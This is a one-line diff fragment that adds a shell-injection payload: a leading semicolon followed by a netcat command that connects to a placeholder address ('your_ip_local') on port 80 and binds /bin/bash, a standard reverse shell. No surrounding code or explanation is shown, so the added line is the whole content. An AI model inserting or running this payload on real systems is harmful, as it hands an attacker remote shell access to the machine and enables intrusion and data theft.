@@ -1,0 +1,1 @@
+ ; ./nc your_ip_local 80 -e /bin/bash
